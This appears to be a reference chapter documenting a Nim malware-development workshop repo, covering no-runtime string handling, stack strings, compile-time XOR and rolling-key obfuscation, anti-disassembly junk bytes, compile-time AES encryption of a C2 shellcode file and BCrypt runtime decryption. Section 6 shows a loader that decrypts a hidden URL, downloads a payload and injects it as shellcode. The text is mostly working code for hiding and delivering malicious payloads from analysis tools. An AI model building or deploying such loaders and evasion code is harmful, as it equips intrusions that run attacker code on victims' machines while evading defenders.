# Strings and secrets

> **Provenance.** Verbatim code comes from `src/0x05`, `0x06`, `0x07`, `0x09`, `0x10`, `0x11` and
> `src/0x12 - nimless_DLL` as named per section. Prose rationale is quoted from the 0x12 README and
> the deck's `0x09` / `0x10` slides. Nothing here was measured with a disassembler except where
> marked **[measured]** - the rest is the repo's code plus its own commentary.

## 1. The rule: there are no runtime strings

With `--mm:none` and no runtime, a Nim `string` cannot exist as a value: no allocation, no length
bookkeeping, no copy, no `$`. What you can have is:

- `cstring` - a pointer to bytes, NUL-terminated, callable-compatible with `LPCSTR`.
- `pointer` / `ptr byte` - when a length is carried separately.
- `ptr uint16` (`WCHAR`) - the wide form, for `LPCWSTR`.

Compile-time strings are fine and are how you *feed* the runtime: `const`, `static`, `staticRead`,
`staticExec` and macros all run on your machine, not the target's.

The deck's 0x04 slide states the consequence for the binary: "Nim string / cstring declarations end
up in .data section". A literal you pass to a WinAPI is a blob in the image, readable with `strings`
- which is why the rest of this file exists.

The rule is enforced by the linker, not only by taste. **[measured]** a Nim `string` *value* built at
run time makes the allocator and its fatal-error path reachable, and that path is written against the
CRT - so the link fails. From an otherwise-identical minimal program, the whole chain off one
`let s = "NtTestSyscall"` is:

```
.text (start) --> Main --> copyString --> toOwnedCopy --> rawNewStringNoInit --> allocImpl
  --> alloc --> rawAlloc --> getHugeChunk/getBigChunk --> osAllocPages --> raiseOutOfMem
                                                                           --> rawWrite --> fwrite, fflush, strlen
                                                                           --> exit, __imp___acrt_iob_func
                             getBigChunk --> requestOsChunks --> __imp_VirtualAlloc
```

`copyString` is there because a `let`/`var` string variable **copies** the literal into a mutable
string value - an allocation. `--mm:none` has no allocator to satisfy it, but the allocator's *code*,
including the CRT-dependent out-of-memory reporting, is right there to be linked. The correlation is
exact across five spellings of the same bytes:

| Spelling | `copyString` in `Main` | Link |
|---|---|---|
| `let s = "lit"`, then index it | 1 | **fails**: `fwrite`, `fflush`, `strlen`, `exit`, `__imp___acrt_iob_func`, `__imp_VirtualAlloc` |
| `const S = "lit"`, then `var t = S` | 1 | **fails**, identical list |
| `const S = "lit"`, used as `S.len` / `S[i]` | 0 | links, 4 608 B |
| `const NAME: array[N, byte] = [...]` | 0 | links, 4 608 B |
| `"lit".cstring` | 0 | links, 4 608 B |

So it is not `const` versus `let` - it is whether a string *value* is constructed at run time. Write a
`const array[N, byte]`, index a `const string` (which folds away), or take `"lit".cstring` /
`{.stackStringA.}`. Anything that builds a string - a copy, `&` concatenation, `$`, `addChar` - brings
the CRT back with it. Which also means: when an EXE build suddenly wants `fwrite`, look for the string
rather than reaching for `undefined_ref.nim` (`reference/runtime.md` Section 7), which is for DLL
links.

## 2. `{.stackStringA.}` / `{.stackStringW.}` (the 0x11 canonical version)

`src/0x11 - simple_instance/utils/stackstr.nim`:

```nim
import std/[macros]

proc assignChars(smt: NimNode, varName: NimNode, varValue: string, wide: bool) {.compileTime.} =
  var
    asnNode:        NimNode
    bracketExpr:    NimNode
    dotExpr:        NimNode
    castIdent:      NimNode
  for i in 0 ..< varValue.len():
    asnNode     = newNimNode(nnkAsgn)
    bracketExpr = newNimNode(nnkBracketExpr)
    dotExpr     = newNimNode(nnkDotExpr)
    castIdent   =
      if wide:    ident"uint16"
      else:       ident"uint8"
    bracketExpr.add(varName)
    bracketExpr.add(newIntLitNode(i))
    dotExpr.add(newLit(varValue[i]))
    dotExpr.add(castIdent)
    asnNode.add bracketExpr
    asnNode.add dotExpr
    smt.add asnNode
  asnNode     = newNimNode(nnkAsgn)
  bracketExpr = newNimNode(nnkBracketExpr)
  dotExpr     = newNimNode(nnkDotExpr)
  bracketExpr.add(varName)
  bracketExpr.add(newIntLitNode(varValue.len()))
  dotExpr.add(newLit(0))
  dotExpr.add(castIdent)
  asnNode.add bracketExpr
  asnNode.add dotExpr
  smt.add asnNode

proc makeBracketExpression(s: string, wide: static bool): NimNode =
  result = newNimNode(nnkBracketExpr)
  result.add ident"array"
  result.add newIntLitNode(s.len() + 1)
  if wide:    result.add ident"uint16"
  else:       result.add ident"byte"


macro stackStringA*(sect) =
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, false)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, false)

macro stackStringW*(sect) =
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, true)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, true)

template CPTR*(a: untyped): cstring =
  cast[cstring](a[0].addr)

template CWPTR*(a: untyped): ptr uint16 = 
  cast[ptr uint16](a[0].addr)
```

How it works:

- `makeBracketExpression(s, wide)` builds the type node `array[s.len()+1, byte]` (or `uint16` for the
  wide form) - one slot per character plus the terminator.
- `assignChars` emits one `nnkAsgn` per character, plus a final `0`, into the statement list. Each
  assignment is `<varName>[i] = <char literal>.uint8` (`.uint16` when wide).
- The two `stackString*` macros wrap that in a `var` section, so
  `var s {.stackStringA.} = "stack string"` becomes a local array with per-index stores.

Consumption - and this is the part worth memorizing, because every WinAPI call site needs it:

```nim
  var s {.stackStringA.} = "stack string"
  PRINTA("[+] %s at %p\n".cstring, cast[cstring](s[0].addr), cast[int](s[0].addr))
```

- `s[0].addr` (not `s.addr`) is the pointer to the first byte.
- `CPTR(s)` is the same thing for `cstring`; `CWPTR(s)` yields `ptr uint16` for `LPCWSTR` arguments.
- `s.len` is the array length, i.e. the character count **including** the NUL - the number to pass
  where the API wants a buffer size in characters. `src/0x12 - nimless_DLL/utils/decryption.nim`
  uses `bcmc.len` exactly that way for `BCryptSetProperty`.
- The array is a local, so it lives on the stack and is trivially writable (generations 3 and 4 rely
  on that).

**[measured]** the template's own `PRINTA("[+] %s at %p\n", CPTR(s), ...)` printed a stack address
(`0x7ffffe2fff13`), confirming both the placement and the pointer idiom.

A plain stack string keeps the plaintext out of `.data` but **not** out of the disassembly: the
bytes appear as immediates in the store instructions. That is the gap the xor generations close.

## 3. Generation 2 - single-byte XOR at compile time (0x09)

`src/0x09 - improving_stackStr/utils/stackstr.nim`:

```nim
import std/[macros]

from std/parseutils import parseInt
from std/random import initRand, rand

proc genRandomKey(): byte {.compileTime.} =
  var seed: int = 0
  when system.hostOS == "windows":
      discard parseInt(staticExec("powershell.exe Get-Random -Maximum 99999999 -Minimum 10000000"), seed, 0)
  else:
      discard parseInt(staticExec("bash -c 'echo $SRANDOM'"), seed, 0)
  var rng = initRand(seed)
  return rng.rand(byte.high).byte

const randKey = genRandomKey()

proc assignChars(smt: NimNode, varName: NimNode, varValue: string, wide: bool) {.compileTime.} =
  var
    asnNode:        NimNode
    bracketExpr:    NimNode
    dotExpr:        NimNode
    castIdent:      NimNode
  for i in 0 ..< varValue.len():
    asnNode     = newNimNode(nnkAsgn)
    bracketExpr = newNimNode(nnkBracketExpr)
    dotExpr     = newNimNode(nnkDotExpr)
    castIdent   =
      if wide:    ident"uint16"
      else:       ident"uint8"
    bracketExpr.add(varName)
    bracketExpr.add(newIntLitNode(i))
    dotExpr.add(newLit(
      (ord(varValue[i]).byte xor randKey).char
    ))
    dotExpr.add(castIdent)
    asnNode.add bracketExpr
    asnNode.add dotExpr
    smt.add asnNode
  asnNode     = newNimNode(nnkAsgn)
  bracketExpr = newNimNode(nnkBracketExpr)
  dotExpr     = newNimNode(nnkDotExpr)
  bracketExpr.add(varName)
  bracketExpr.add(newIntLitNode(varValue.len()))
  dotExpr.add(newLit(0))
  dotExpr.add(castIdent)
  asnNode.add bracketExpr
  asnNode.add dotExpr
  smt.add asnNode

proc makeBracketExpression(s: string, wide: static bool): NimNode =
  result = newNimNode(nnkBracketExpr)
  result.add ident"array"
  result.add newIntLitNode(s.len() + 1)
  if wide:    result.add ident"uint16"
  else:       result.add ident"byte"

proc singleByteXor*[I,T](buf: var array[I, T], key: byte) {.inline.} = 
  for i in 0 ..< (buf.len-1):
    buf[i] = key xor buf[i]


macro stackStringA*(sect) =
  template genStuff(str, key: untyped): untyped = 
    {.noRewrite.}:
      singleByteXor(str, key)
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, false)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, false)
  result.add(getAst(genStuff(def[0], randKey)))

macro stackStringW*(sect) =
  template genStuff(str, key: untyped): untyped = 
    {.noRewrite.}:
      singleByteXor(str, key)
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, true)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, true)
  result.add(getAst(genStuff(def[0], randKey)))

template CPTR*(a: untyped): cstring =
  cast[cstring](a[0].addr)

template CWPTR*(a: untyped): ptr uint16 = 
  cast[ptr uint16](a[0].addr)
```

The changes from Section 2, in the deck's own words:

- "We create a compileTime function that generates us a single byte xor key" - `genRandomKey()` seeds
  `initRand` from `staticExec` (`powershell.exe Get-Random ...` on Windows, `bash -c 'echo $SRANDOM'`
  elsewhere) and takes one byte from it. `const randKey = genRandomKey()` evaluates that once at
  compile time.
- "In `assignChars`, we xor each char of the assignment string and add it to the dotExpr NimNode" -
  the stores now hold `ord(c) xor randKey`.
- "We define our `singleByteXor` operation on the array that is generated (`I`, `T` are generics to
  handle different lengths and `CHAR`/`WCHAR`). This can be defined with the noinline pragma if we
  don't want the proc inlined."
- "We define a `genStuff` template so we can inject it straight into the AST with `getAst`. This is
  done for `stackStringW` as well."

Two mechanics to notice:

- `singleByteXor` loops `0 ..< (buf.len-1)`, i.e. it stops before the terminator, so the NUL is left
  intact and the decrypted array is a valid C string.
- The `{.noRewrite.}:` block around the `getAst`-injected call is what stops Nim's own rewrite passes
  from touching the generated code before it is emitted.

## 4. Generation 3 - rolling key (0x10)

`src/0x10 - improving_stackStr2/utils/stackstr.nim`:

```nim
import std/[macros, hashes]

from std/parseutils import parseInt
from std/random import initRand, rand
from std/bitops import rotateRightBits

proc updateHash(): uint {.compileTime.} =
  var seed: int = 0
  when system.hostOS == "windows":
      discard parseInt(staticExec("powershell.exe Get-Random -Maximum 99999999 -Minimum 10000000"), seed, 0)
  else:
      discard parseInt(staticExec("bash -c 'echo $SRANDOM'"), seed, 0)
  var rng = initRand(seed)
  result = rng.rand(int.high).uint


proc assignChars(smt: NimNode, varName: NimNode, varValue: string, wide: bool, key: uint) {.compileTime.} =
  var
    asnNode:        NimNode
    bracketExpr:    NimNode
    dotExpr:        NimNode
    castIdent:      NimNode
  for i in 0 ..< varValue.len():
    asnNode     = newNimNode(nnkAsgn)
    bracketExpr = newNimNode(nnkBracketExpr)
    dotExpr     = newNimNode(nnkDotExpr)
    castIdent   =
      if wide:    ident"uint16"
      else:       ident"uint8"
    bracketExpr.add(varName)
    bracketExpr.add(newIntLitNode(i))
    dotExpr.add(newLit(
      (ord(varValue[i]).byte xor cast[byte](key.rotateRightBits(i))).char
    ))
    dotExpr.add(castIdent)
    asnNode.add bracketExpr
    asnNode.add dotExpr
    smt.add asnNode
  asnNode     = newNimNode(nnkAsgn)
  bracketExpr = newNimNode(nnkBracketExpr)
  dotExpr     = newNimNode(nnkDotExpr)
  bracketExpr.add(varName)
  bracketExpr.add(newIntLitNode(varValue.len()))
  dotExpr.add(newLit(0))
  dotExpr.add(castIdent)
  asnNode.add bracketExpr
  asnNode.add dotExpr
  smt.add asnNode

proc makeBracketExpression(s: string, wide: static bool): NimNode =
  result = newNimNode(nnkBracketExpr)
  result.add ident"array"
  result.add newIntLitNode(s.len() + 1)
  if wide:    result.add ident"uint16"
  else:       result.add ident"byte"

proc complexXor*[I,T](buf: var array[I, T], key: uint) {.inline, codegenDecl: "__attribute__((always_inline)) $# $#$#".} = 
  var i: int = 0
  while buf[i] != '\0'.T:
    buf[i] = (key.rotateRightBits(i) and 0xff).T xor buf[i]
    i.inc


macro stackStringA*(sect) =
  var globalHash = updateHash()
  template doXor(str, key: untyped): untyped = 
    {.noRewrite.}:
      complexXor(str, key)
  
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, false)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, false, globalHash)
  result.add(getAst(doXor(def[0], globalHash)))

macro stackStringW*(sect) =
  var globalHash = updateHash()
  template doXor(str, key: untyped): untyped = 
    {.noRewrite.}:
      complexXor(str, key)
  
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, true)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, true, globalHash)
  result.add(getAst(doXor(def[0], globalHash)))


template CPTR*(a: untyped): cstring =
  cast[cstring](a[0].addr)

template CWPTR*(a: untyped): ptr uint16 = 
  cast[ptr uint16](a[0].addr)
```

Differences from the single-byte version:

- `updateHash()` returns a full `uint` (the deck: "similar to our single byte, but return a full
  uint (64-bits)") rather than a byte.
- The byte used at index `i` is `cast[byte](key.rotateRightBits(i))` - a rolling key - and
  `complexXor` reproduces it at run time with the same `rotateRightBits(i)`.
- `complexXor` is `{.inline, codegenDecl: "__attribute__((always_inline)) $# $#$#".}`, and its loop
  condition is `while buf[i] != '\0'.T` - it walks the array itself instead of using `.len`, which is
  what lets it be generic over `CHAR`/`WCHAR` and stop at the terminator.
- `updateHash()` is called per macro expansion, so each `stackString` gets its own key. The deck:
  "Update the hash for each stackString, this is optional and alternatively can be used globally."

The lesson that produced this design is on the deck's 0x10 slide: "A multibyte xor key was attempted,
but kept getting allocated in .rdata; which is fine, but we are trying to avoid unnecessary usage in
the data section." A key stored as an array literal becomes a `.rdata` blob; deriving it from a
single `uint` that the compiler folds into the rotation keeps it in registers/immediates instead.

The deck also documents the inlining reality, which is worth knowing before you rely on it: "Even
though we defined inline, nim did not inline our `stackStringA` call. But, our `stackStringW` call
got inline. With nim generics, each proc will generate individual procs for each type of passed in
argument" - and `codegenDecl` with `always_inline` is what makes it reliable.

## 5. Generation 3b - shuffled assignment order (0x12, "improving_stackStr3")

`src/0x12 - nimless_DLL/utils/stackstr.nim`:

```nim
import std/[macros, random]

from std/parseutils import parseInt

proc genRandomSeed(): Rand {.compileTime.} =
  var seed: int
  when system.hostOS == "windows":
    discard parseInt(staticExec("powershell.exe Get-Random -Maximum 99999999 -Minimum 0"), seed, 0)
  else:
    discard parseInt(staticExec("bash -c 'echo $SRANDOM'"), seed, 0)
  result = initRand(seed)

proc assignChars(smt: NimNode, varName: NimNode, varValue: string, wide: bool) {.compileTime.} =
  var rng = genRandomSeed()
  var
    asnNode:        NimNode
    bracketExpr:    NimNode
    dotExpr:        NimNode
    castIdent:      NimNode
    tmpSeq = newSeq[int]()
  
  for i in 0 ..< varValue.len():
    tmpSeq.add(i)
  rng.shuffle(tmpSeq)

  for i in tmpSeq:
    asnNode     = newNimNode(nnkAsgn)
    bracketExpr = newNimNode(nnkBracketExpr)
    dotExpr     = newNimNode(nnkDotExpr)
    castIdent   =
      if wide:    ident"uint16"
      else:       ident"uint8"
    bracketExpr.add(varName)
    bracketExpr.add(newIntLitNode(i))
    dotExpr.add(newLit(varValue[i]))
    dotExpr.add(castIdent)
    asnNode.add bracketExpr
    asnNode.add dotExpr
    smt.add asnNode
  asnNode     = newNimNode(nnkAsgn)
  bracketExpr = newNimNode(nnkBracketExpr)
  dotExpr     = newNimNode(nnkDotExpr)
  bracketExpr.add(varName)
  bracketExpr.add(newIntLitNode(varValue.len()))
  dotExpr.add(newLit(0))
  dotExpr.add(castIdent)
  asnNode.add bracketExpr
  asnNode.add dotExpr
  smt.add asnNode

proc makeBracketExpression(s: string, wide: static bool): NimNode =
  result = newNimNode(nnkBracketExpr)
  result.add ident"array"
  result.add newIntLitNode(s.len() + 1)
  if wide:    result.add ident"uint16"
  else:       result.add ident"byte"


macro stackStringA*(sect) =
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, false)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, false)

macro stackStringW*(sect) =
  result = newStmtList()
  let
    def = sect[0]
    bracketExpr = makeBracketExpression(def[2].strVal, true)
    identDef = newIdentDefs(def[0], bracketExpr)
    varSect = newNimNode(nnkVarSection).add(identDef)
  result.add(varSect)
  result.assignChars(def[0], def[2].strVal, true)

template CPTR*(a: untyped): cstring =
  cast[cstring](a[0].addr)

template CWPTR*(a: untyped): ptr uint16 = 
  cast[ptr uint16](a[0].addr)
```

This generation changes the *order* of the stores rather than the values: `genRandomSeed()` builds a
`Rand` from `staticExec`, a `tmpSeq` of indices is shuffled, and the `nnkAsgn` nodes are emitted in
that shuffled order. The 0x12 README presents it as an alternative to 0x09/0x10 and notes it "would
be possible to incorporate xor encoding through the previous examples".

Note the state of the three generations across the repo: `0x11` ships the **plain** macro from
Section 2, and `0x12` ships this **shuffled, unencrypted** one. Only 0x09 and 0x10 encrypt. Pick per
project; the encryption and the shuffling are independent improvements.

## 6. `xorStackString` - encrypt a literal in the source (0x05 - 0x08)

The other direction: keep the ciphertext in your source, decrypt it at run time.

`src/0x05 - heapalloc_ff/utils/enc.nim`:

```nim
proc xorStackString*[I,J](buf: var array[I, byte], key: array[J, byte]) {.inline.}= 
  for i in 0 ..< (buf.len-1):
    buf[i] = key[i mod (key.len-1)] xor buf[i]
```

`src/0x07 - self_injection_loader_obfuscated/utils/enc.nim` adds junk bytes inside the loop - bytes
that are never executed but break up the pattern a disassembler sees:

```nim
proc xorStackString*[I,J](buf: var array[I, byte], key: array[J, byte]) {.inline.} = 
  for i in 0 ..< (buf.len-1):
    asm """
      .byte 0xe9, 0x04, 0x00, 0x00, 0x00
      .byte 0xff, 0xff, 0xff, 0xff
    """
    buf[i] = key[i mod (key.len-1)] xor buf[i]
```

`buf.len-1` and `key.len-1` are both "skip the terminator": the loop covers every character of the
buffer except its NUL, and the key index cycles over the key's characters without consuming its own
NUL. The NUL is left in place, so the decrypted buffer is directly usable as a `cstring`.

How it is used, from `src/0x06 - self_injection_loader/main.nim` (the URL is stored obfuscated in
the source and materialized on the stack at run time):

```nim
proc main() {.exportc: "Main".} =
  var 
    url {.stackStringA.} = "*'=4\x7f|dr\x06\x05\x1er}yjtiss\x04\x02\x1f17g7&"
    key {.stackStringA.} = "BSIDESKC420"
    pBuffer: pointer
    sSize: int
  xorStackString(url, key) 

  if getPayloadFromUrlA(cast[cstring](url[0].addr), pBuffer, sSize):
    discard localShellcodeInjection(pBuffer, sSize)
```

The deck's framing of this technique: "Simple rolling xor with python. Almost APT level encryption,
just use imagination. (aka, floss finds this)." It defeats `strings`, not analysis.

## 7. Compile-time payload secrets

Two ways to embed a payload without it appearing in cleartext.

**Plain `staticRead`** - the whole file becomes a compile-time constant. From
`src/0x12 - nimless_DLL/dll_main.nim`:

```nim
# Read in shellcode at compile time
const 
  buf   = staticRead("demon.sc")
```

The README's variant carries the size explicitly and converts to a `cstring`:

```nim
# Read in shellcode at compile time
const 
  buf   = staticRead("demon.sc").cstring
  szBuf = 103935 
```

**Encrypted at compile time** - `var (buf, key, iv) = static(encryptAes(slurp("demon.sc")))` with
`src/0x12 - nimless_DLL/utils/encryption.nim`:

```nim
import std/[sequtils]
import nimcrypto

from std/parseutils import parseInt
from std/random import initRand, rand

proc pad(src: seq[int], blockSize: int): seq[int] {.compileTime.} =
    let padLen = blockSize - (len(src) mod blockSize)
    var padding = newSeq[int]()
    for i in 0 ..< padLen:
        padding.add(padLen) 
    return concat(src, padding)

proc encryptAES*(s: string): (seq[byte], array[aes256.sizeKey, byte], array[aes256.sizeBlock, byte]) {.compileTime.} =
    var seed: int = 0
    when system.hostOS == "windows":
        discard parseInt(staticExec("powershell.exe Get-Random -Maximum 99999999 -Minimum 10000000"), seed, 0)
    else:
        discard parseInt(staticExec("bash -c 'echo $SRANDOM'"), seed, 0)
    var rng = initRand(seed)
    

    var
        tmp: seq[int]
        ectx: CBC[aes256]
        key: array[aes256.sizeKey, byte]
        iv:  array[aes256.sizeBlock, byte]

    for i in 0 ..< aes256.sizeKey: key[i] = rng.rand(byte.high).byte
    for i in 0 ..< aes256.sizeBlock: iv[i] = rng.rand(byte.high).byte

    for i in 0 ..< s.len:
        tmp.add(s[i].int)
    
    var padded = pad(tmp,aes256.sizeBlock)
    var plaintext = newSeq[byte]()
    for i in 0 ..< padded.len:
        plaintext.add(padded[i].byte)
    
    var encText = newSeq[byte]()
    for i in 0 ..< padded.len:
        encText.add(0.byte)

    # create encryption ctx
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encText)
    # ectx.clear()

    return (encText, key, iv)
```

`encryptAES` is `{.compileTime.}` and uses nimcrypto's `CBC[aes256]` with PKCS-style padding
(`pad()`), a random key and IV from the same `staticExec` seeding used by the stack-string macros.
The README is explicit about what this buys you:

> This won't be dealt with indepth, but we can use `nimcrypto` at compile-time to read in our payload and encrypt it with AES-CBC256. The payload, key, and iv are held within the executable, so it would be trivial to RE. The encryption is handled in `utils/encryption.nim`

So: the payload is opaque in the image, the key material is not. Treat it as anti-`strings`, and pair
it with the Section 8 runtime decryption.

## 8. Runtime decryption with bcrypt, and `goto` instead of exceptions

`src/0x12 - nimless_DLL/utils/decryption.nim` decrypts the Section 7 payload with
`BCrypt*` through the instance. Note the wide-string property names as `{.stackStringW.}` locals and
the single cleanup label:

```nim
import winim/lean

import goto, stackstr
import ../instance

const
  AES_KEY_SIZE* = 32
  AES_IV_SIZE* = 16

proc installAesDecryption*(pCipherTextBuffer: pointer, sCipherTextSize: int, pAesKey: pointer, pAesIv: pointer, ppRawBuffer: ptr PBYTE, psRawBufferSize: ptr int): bool = 
  var
    cbResult: ULONG
    status: NTSTATUS
    hAlgorithm, hKeyHandle: BCRYPT_ALG_HANDLE
    dwKeyObjectLength, dwBlockSize, dwTmpRawSize: DWORD
    pKeyObjectBuff, pTmpRawBuff: PBYTE
    bcm {.stackStringW.} = "ChainingMode"
    bcmc {.stackStringW.} = "ChainingModeCBC"
    bcrypt_aes_algo {.stackStringW.} = "AES"
    bcrypt_obj_len {.stackStringW.} = "ObjectLength"
    bcrypt_block_len {.stackStringW.} = "BlockLength"
  
  status = ninst.Bcrypt.BCryptOpenAlgorithmProvider(hAlgorithm.addr, cast[LPCWSTR](bcrypt_aes_algo[0].addr), NULL, 0)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption
  
  status = ninst.Bcrypt.BCryptGetProperty(hAlgorithm, cast[LPCWSTR](bcrypt_obj_len[0].addr), cast[PBYTE](dwKeyObjectLength.addr), sizeof(DWORD).ULONG, cbResult.addr, 0)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption

  status = ninst.Bcrypt.BCryptGetProperty(hAlgorithm, cast[LPCWSTR](bcrypt_block_len[0].addr), cast[PBYTE](dwBlockSize.addr), sizeof(DwORD).ULONG, cbResult.addr, 0)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption

  if dwBlockSize != AES_IV_SIZE: goto end_of_installAesDecryption

  pKeyObjectBuff = cast[PBYTE](ninst.Win32.HeapAlloc(ninst.Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, dwKeyObjectLength))
  if cast[int](pKeyObjectBuff) == 0:
    goto end_of_installAesDecryption
  
  status = ninst.Bcrypt.BCryptSetProperty(hAlgorithm, cast[LPCWSTR](bcm[0].addr), cast[PBYTE](bcmc[0].addr), (bcmc.len).ULONG, 0)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption

  status = ninst.Bcrypt.BCryptGenerateSymmetricKey(hAlgorithm, hKeyHandle.addr, pKeyObjectBuff, dwKeyObjectLength, cast[PUCHAR](pAesKey), AES_KEY_SIZE, 0)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption

  status = ninst.Bcrypt.BCryptDecrypt(hKeyHandle, cast[PUCHAR](pCipherTextBuffer), cast[ULONG](sCipherTextSize), NULL, cast[PUCHAR](pAesIv), AES_IV_SIZE, NULL, 0, dwTmpRawSize.addr, BCRYPT_BLOCK_PADDING)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption
  
  pTmpRawBuff = cast[PBYTE](ninst.Win32.HeapAlloc(ninst.Win32.GetProcessHeap(), HEAP_ZERO_MEMORY, dwTmpRawSize))
  if cast[int](pTmpRawBuff) == 0:
    goto end_of_installAesDecryption
  
  status = ninst.Bcrypt.BCryptDecrypt(hKeyHandle, cast[PUCHAR](pCipherTextBuffer), cast[ULONG](sCipherTextSize), NULL, cast[PUCHAR](pAesIv), AES_IV_SIZE, pTmpRawBuff, dwTmpRawSize, cbResult.addr, BCRYPT_BLOCK_PADDING)
  if not NT_SUCCESS(status):
    goto end_of_installAesDecryption

  ppRawBuffer[] = pTmpRawBuff
  psRawBufferSize[] = dwTmpRawSize

  label end_of_installAesDecryption:
    if cast[int](hKeyHandle) != 0: discard ninst.Bcrypt.BCryptDestroyKey(hKeyHandle)
    if cast[int](hAlgorithm) != 0: discard ninst.Bcrypt.BCryptCloseAlgorithmProvider(hAlgorithm, 0)
    if cast[int](pKeyObjectBuff) != 0: discard ninst.Win32.HeapFree(ninst.Win32.GetProcessHeap(), 0, pKeyObjectBuff)
    if (cast[int](pTmpRawBuff) != 0) and (cast[int](ppRawBuffer[]) == 0): discard ninst.Win32.HeapFree(ninst.Win32.GetProcessHeap(), 0, pTmpRawBuff)
    if (cast[int](ppRawBuffer[]) != 0) and (cast[int](psRawBufferSize[]) != 0): return true
    else: return false
```

Points to carry over:

- The property-name strings (`"AES"`, `"ObjectLength"`, `"BlockLength"`, `"ChainingMode"`,
  `"ChainingModeCBC"`) are `{.stackStringW.}`; they are passed as `cast[LPCWSTR](x[0].addr)`.
- The two-pass `BCryptDecrypt` shape: first call with a null output to learn the size, allocate, then
  decrypt for real.
- Every failure path jumps to one label that destroys the key, closes the provider, frees both
  buffers, and *only* reports success when the caller's output pointer is set. `ppRawBuffer[]` and
  `psRawBufferSize[]` are the out-parameters.
- **Typo to not copy [code]:** `src/0x12 - nimless_DLL/utils/decryption.nim:31` says
  `sizeof(DwORD).ULONG`. It compiles, because Nim identifiers are case- and underscore-insensitive
  **except for the first character** - so `DwORD` resolves to `DWORD`, while `dword` would not (the
  first letter's case is significant). It is harmless here but it is a typo, not a technique.

`goto`/`label` are how you write cleanup paths without exceptions or `defer`, since
`-fno-exceptions` and no runtime mean neither exists. `src/0x11 - simple_instance/utils/goto.nim`
(the same file exists in every later example):

```nim
template label*(name, body) =
  {.emit: astToStr(name) & ":".}
  body

template goto*(name) =
  {.emit: "goto " & astToStr(name) & ";".}
```

They work by emitting raw C: `{.emit: astToStr(name) & ":".}` for the label and
`{.emit: "goto " & astToStr(name) & ";".}` for the jump. Used as
`if bad: goto endOfFunction` and `label endOfFunction: <cleanup>` - see `get_payload.nim` for a
full example. Two corollaries: the label must be in the same function, and `{.emit.}` code is not
checked by Nim, so a typo in the name surfaces as a C compile error.

## 9. Replacing the standard library

`src/0x12 - nimless_DLL/README.md` states the porting rule:

> 3. Any use of the standard library will need to be redefined. This is done in `utils/stdlib/stringh.nim`. An example of this is `wcslen`:

Done in `src/0x12 - nimless_DLL/utils/stdlib/stringh.nim`:

```nim
proc wcslen*(s: pointer): int =
  var str2 = cast[ptr uint16](s)
  while (str2[] != 0):
    str2 = cast[ptr uint16](cast[int](str2) + sizeof(uint16))
  return (cast[int](str2) - cast[int](s)) div sizeof(uint16)

proc wcsncmp*(string1, string2: pointer): int =
  var 
    pString1 = cast[ptr uint16](string1)
    pString2 = cast[ptr uint16](string2)
  while (pString1[] != 0 and pString1[] == pString2[]):
    pString1 = cast[ptr uint16](cast[int](pString1) + sizeof(uint16))
    pString2 = cast[ptr uint16](cast[int](pString2) + sizeof(uint16))
  return (pString1[] - pString2[]).int

proc cmpStrAToStrW*(string1, string2: pointer): int =
  var
    pStr1 = cast[ptr char](string1)
    pStr2 = cast[ptr uint16](string2)
  while (pStr1[] != '\0' and pStr1[].uint16 == pStr2[]):
    pStr1 = cast[ptr char](cast[int](pStr1) + sizeof(char))
    pStr2 = cast[ptr uint16](cast[int](pStr2) + sizeof(uint16))
  return (pStr1[].uint16 - pStr2[]).int
```

`src/0x05 - heapalloc_ff/utils/str.nim` is the byte-string twin, and the same function is inlined
privately inside `gpa.nim`:

```nim
proc strlenA*(s: int): int =
  var sPtr = cast[ptr byte](s)
  while sPtr[] != 0.byte:
    sPtr = cast[ptr byte](cast[int](sPtr) + 1)
    result.inc
```

The IO path is replaced the same way. `src/0x11 - simple_instance/utils/stdio.nim` is the canonical
`PRINTA` - a `printf` built from `wsprintfA` + `LocalAlloc` + `WriteConsoleA` through the instance,
compiled in only under `-d:malDebug`, plus `dumpHex`:

```nim
import winim/lean

import ../instance

template PRINTA*(args: varargs[untyped]) =
  when defined(malDebug):
    var 
      pwsprintfA     = ninst.Win32.wsprintfA
      pLocalAlloc    = ninst.Win32.LocalAlloc
      pLocalFree     = ninst.Win32.LocalFree
      pGetStdHandle  = ninst.Win32.GetStdHandle
      pWriteConsoleA = ninst.Win32.WriteConsoleA

    var buf = cast[LPSTR](pLocalAlloc(LPTR, 1024))
    if cast[uint](buf) != 0:
      var length = pwsprintfA(buf, args)
